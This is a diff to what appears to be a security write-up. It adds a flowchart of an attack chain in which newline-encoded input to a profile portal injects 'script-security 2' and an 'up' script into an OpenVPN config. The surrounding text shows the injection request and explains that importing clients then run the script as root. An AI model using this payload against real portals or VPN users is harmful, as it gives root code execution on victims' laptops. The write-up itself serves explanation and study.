@@ -23,6 +23,22 @@ POST /profile/generate
 username=fin%0Ascript-security%202%0Aup%20/tmp/x.sh%0A
 ```
 
+### // The chain
+
+```mermaid
+flowchart LR
+  attacker([attacker])
+  portal[/profile portal\nFlask + Jinja2/]
+  ovpn[(injected .ovpn)]
+  client{{OpenVPN client}}
+  shell([root shell])
+
+  attacker -->|"username with \n"| portal
+  portal -->|interpolates raw| ovpn
+  ovpn -->|imported by victim| client
+  client -->|script-security 2 + up| shell
+```
+
 ### // The payload
 
 OpenVPN runs the `up` script as root by default on Linux clients. The `script-security 2` directive enables user-supplied scripts. Two extra lines in the profile and every laptop that imports it executes my code at connect time.
